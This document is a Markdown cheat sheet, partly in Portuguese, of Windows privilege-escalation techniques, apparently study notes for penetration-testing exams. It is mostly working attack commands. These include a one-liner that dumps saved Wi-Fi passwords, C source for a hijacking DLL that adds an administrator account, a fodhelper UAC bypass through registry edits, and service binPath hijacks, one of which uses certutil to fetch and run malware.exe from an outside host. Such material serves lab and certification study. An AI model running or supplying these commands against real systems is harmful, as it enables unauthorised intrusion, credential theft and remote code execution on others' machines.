## PRIVILEGE ESCALATION FOR WINDOWS  
[![Banner](banner.png)]()  

#### LInks:  
> https://www.fuzzysecurity.com/tutorials/16.html  
> https://sushant747.gitbooks.io/total-oscp-guide/content/escaping_restricted_shell.html  
> https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/  
> https://github.com/Gr1mmie/Windows-Privilege-Escalation-Resources  
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md  
> https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html  


#### Enumerando o sistema:  
```
C:\> systeminfo 
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### Enumeracao de usuarios:  
```
C:\> whoami /priv
C:\> whoami /groups
C:\> net user
C:\> net user administrator
C:\> net localgroup
C:\> net localgroup administrators
```

#### Enumeracao de rede:  
```
C:\> ipconfig /all
C:\> route print
C:\> netstat -ano
```

#### Password hunting:  
```
C:\> findstr /si password *.txt *.ini *.config
C:\> net show profile
C:\> cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

#### Enumeracao de av/firewall:  
```
C:\> sc query windefend
C:\> sc queryex type= service
C:\> netsh advfirewall firewall dump
C:\> netsh firewall show state
```

#### Automated tools:  
> [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation]

###### Executables:  
```
winPEAS.exe
Seatbelt.exe (compile)
Watson.exe (compile)
sharpUp.exe (compile)
```  
> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS  
> https://github.com/GhostPack/Seatbelt  
> https://github.com/rasta-mouse/Watson  
> https://github.com/GhostPack/SharpUp  


###### PowerShell  
###### Sherlock.ps1  
###### PowerUp.ps1  
###### jaws-enum.ps1  

> https://github.com/rasta-mouse/Sherlock  
> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
> https://github.com/411Hall/JAWS  

#### Other:  
###### windows-exploit-suggester.py (local)  
###### Exploit Suggester (metasploit)  

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester  
> https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/  

#### Windows exploit suggester:
```
C:\> systeminfo > sysinfo.txt
$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
$ pip install python-xlrd ; pip install xlrd --upgrade
$ git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
$ ./windows-exploit-suggester.py --update
$ ./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
```

#### Buscando arquivos no windows:  
```
C:\> where /R c:\windows bash.exe
```

#### Impersonation e ataques de potato:  
> https://ohpe.it/juicy-potato/  
> https://github.com/ohpe/juicy-potato  
> https://github.com/rapid7/metasploit-framework/pull/11230  

###### OU  
```
meterpreter> getsystem -h
meterpreter> getsystem 0
```

#### Runas:  
```
C:\> cmdkey /list
C:\> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"  
```

#### DLL hijacking:  
```
$ pico malw_dll.c
```

```
// For x64 compile with: x86_64-mingw32-gcc malw_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc malw_dll.c -shared -o output.dll

#include <windows.h>

BOLL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators hacker /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```
$ x86_64-mingw32-gcc malw_dll.c -shared -o hijacking.dll
$ python2 -m SimpleHTTPServer -p 80
```  

##### Bypass uac:  
> [outro: https://redteamer.tips/uac-bypass-through-trusted-folder-abuse/] 
```
C:\Users\bob\Downloads\SysinternalsSuite> sigcheck.exe -a -m c:\windows\system32\fodhelper.exe
```

###### OU:  
```
C:\Users\bob\Downloads\SysinternalsSuite> sigcheck.exe -a -m c:\windows\system32\computerdefaults.exe
C:\Users\bob\Downloads\SysinternalsSuite> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command  <-analisar EXE com procmon primeiro
C:\Users\bob\Downloads\SysinternalsSuite> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
C:\Users\bob\Downloads\SysinternalsSuite> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

#### Services:  
```
C:\> wmic service get Name,State,Path | findstr "Running" | findstr "Program "
C:\> icacls "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

###### OU:  
```
C:\> C:\Users\bob\Downloads\SysinternalsSuite> accesschk.exe -wvcu "Users" *
C:\> sc query NOME_DO_SERVICO
C:\> sc config NOME_DO_SERVICO binPath="net user alice Pass@123 /add"
C:\> sc qc NOME_DO_SERVICO
C:\> sc stop NOME_DO_SERVICO
C:\> sc query NOME_DO_SERVICO
C:\> sc start NOME_DO_SERVICO
```

###### OU:  
```
C:\> sc config NOME_DO_SERVICO binPath="certutil -urlcache -f http://192.168.0.16/malware.exe file.exe"
C:\> sc config NOME_DO_SERVICO binPath="file.exe"
C:\> sc stop NOME_DO_SERVICO
C:\> sc start NOME_DO_SERVICO
```

